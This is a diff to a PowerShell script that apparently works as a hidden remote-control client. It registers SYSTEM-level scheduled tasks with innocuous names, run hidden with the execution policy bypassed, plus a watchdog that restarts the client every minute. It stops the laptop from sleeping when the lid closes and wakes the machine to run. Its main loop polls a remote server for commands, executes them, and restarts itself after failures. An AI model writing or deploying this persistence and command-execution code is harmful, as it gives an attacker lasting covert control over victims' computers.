@@ -48,9 +48,9 @@ if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Adm
 # ╔══════════════════════════════════════════════════════════════════════════════╗
 # ║  PERSISTENCE (Scheduled Tasks)                                             ║
 # ║  Two tasks: main (startup+logon) + watchdog (every 1 min).                ║
-# ║  Survives: reboot, shutdown, user killing process from Task Manager.       ║
-# ║  To remove: delete this block, and also remove $taskName/$watchdogTaskName ║
-# ║  from CONFIGURATION. Script will run only once until manually restarted.   ║
+# ║  Survives: reboot, shutdown, sleep, user killing process from Task Manager.║
+# ║  Always re-registers with -Force to keep settings current.                ║
+# ║  To remove: delete this block. Script will run only once manually.         ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
 $taskName = "SystemManagementUpdate"
 $watchdogTaskName = "SystemManagementUpdateWatchdog"
@@ -59,22 +59,37 @@ $action = if ($isExePayload) {
 } else {
     New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$selfPath`""
 }
-$settings = New-ScheduledTaskSettingsSet -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew
+$settings = New-ScheduledTaskSettingsSet -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -WakeToRun -MultipleInstances IgnoreNew
 $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
-    $startupTrigger = New-ScheduledTaskTrigger -AtStartup
-    $logonTrigger = New-ScheduledTaskTrigger -AtLogOn
-    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger @($startupTrigger, $logonTrigger) -Settings $settings -Principal $principal -Force | Out-Null
+$startupTrigger = New-ScheduledTaskTrigger -AtStartup
+$logonTrigger = New-ScheduledTaskTrigger -AtLogOn
+Register-ScheduledTask -TaskName $taskName -Action $action -Trigger @($startupTrigger, $logonTrigger) -Settings $settings -Principal $principal -Force | Out-Null
+$watchdogAction = if ($isExePayload) {
+    New-ScheduledTaskAction -Execute $selfPath
+} else {
+    New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$selfPath`""
 }
-if (-not (Get-ScheduledTask -TaskName $watchdogTaskName -ErrorAction SilentlyContinue)) {
-    $watchdogAction = if ($isExePayload) {
-        New-ScheduledTaskAction -Execute $selfPath
-    } else {
-        New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$selfPath`""
-    }
-    $watchdogTrigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1)) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days 3650)
-    Register-ScheduledTask -TaskName $watchdogTaskName -Action $watchdogAction -Trigger $watchdogTrigger -Settings $settings -Principal $principal -Force | Out-Null
-}
+$watchdogTrigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1)) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days 3650)
+Register-ScheduledTask -TaskName $watchdogTaskName -Action $watchdogAction -Trigger $watchdogTrigger -Settings $settings -Principal $principal -Force | Out-Null
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  ANTI-SLEEP POWER POLICY (removable)                                       ║
+# ║  Prevents laptop from sleeping on lid close. Without this, the machine    ║
+# ║  goes to sleep and all processes freeze — no reconnection possible.        ║
+# ║  Sets: lid close = do nothing, standby timeout = never (AC + battery).     ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+try {
+    # Lid close action: 0 = do nothing (AC)
+    powercfg /setacvalueindex SCHEME_CURRENT SUB_BUTTONS LIDACTION 0 2>$null
+    # Lid close action: 0 = do nothing (Battery)
+    powercfg /setdcvalueindex SCHEME_CURRENT SUB_BUTTONS LIDACTION 0 2>$null
+    # Disable standby timeout (AC)
+    powercfg /change standby-timeout-ac 0 2>$null
+    # Disable standby timeout (Battery — set to 30 min to save some battery)
+    powercfg /change standby-timeout-dc 30 2>$null
+    # Apply changes
+    powercfg /setactive SCHEME_CURRENT 2>$null
+} catch {}
 
 # ╔══════════════════════════════════════════════════════════════════════════════╗
 # ║  LOGGING (shell.txt)                                                       ║
@@ -491,6 +506,7 @@ function Invoke-CommandStreaming {
 # ║  MAIN LOOP                                                                ║
 # ║  Polls the server for commands, executes them, and reconnects on failure. ║
 # ║  Adaptive polling: 1s → 3s → 5s when idle. Exponential backoff on error. ║
+# ║  Self-kill after 5 min continuous failure so watchdog can restart fresh.   ║
 # ║  Do NOT remove — this is the entry point.                                 ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
 function Connect-Cloudflare {
@@ -499,12 +515,15 @@ function Connect-Cloudflare {
     $idleStep2     = 3000
     $idleStep3     = 5000
     $consecutiveIdle = 0
+    $failingSince  = $null    # timestamp of first consecutive failure
+    $selfKillMins  = 5        # kill self after this many minutes of non-stop failure
 
     Write-Log "Client started. PID=$PID. Connecting to $cfHost"
 
     while ($true) {
         try {
             $command = Get-Command-From-Server
+            $failingSince = $null  # connection succeeded — reset failure timer
 
             if ($command -and $command -ne "") {
                 $retryCount = 0
@@ -535,13 +554,33 @@ function Connect-Cloudflare {
             $retryCount++
             Write-Log "Connection error #$retryCount : $($_.Exception.Message)" "ERROR"
 
+            # Track how long we've been failing continuously
+            if ($null -eq $failingSince) { $failingSince = Get-Date }
+
             $backoff = [Math]::Min(60, [Math]::Pow(2, $retryCount))
             Start-Sleep -Seconds $backoff
 
             if ($retryCount -ge $maxRetries) {
-                Write-Log "Max retries ($maxRetries) hit. Resetting counter." "WARN"
+                Write-Log "Max retries ($maxRetries) hit. Flushing connections." "WARN"
                 $retryCount = 0
+
+                # --- CONNECTION RECOVERY (fixes stale pool after sleep/wake) ---
+                try { [System.Net.ServicePointManager]::FindServicePoint([Uri]$cfHost).CloseConnectionGroup("") } catch {}
+                try { ipconfig /flushdns 2>$null | Out-Null } catch {}
+                # --- end connection recovery ---
             }
+
+            # --- SELF-KILL after continuous failure (watchdog restarts fresh) ---
+            if ($null -ne $failingSince) {
+                $failMinutes = ((Get-Date) - $failingSince).TotalMinutes
+                if ($failMinutes -ge $selfKillMins) {
+                    Write-Log "Failing for ${failMinutes}m. Self-killing for watchdog restart." "WARN"
+                    try { $script:singleInstanceMutex.ReleaseMutex() } catch {}
+                    try { $script:singleInstanceMutex.Dispose() } catch {}
+                    exit
+                }
+            }
+            # --- end self-kill ---
         }
     }
 }
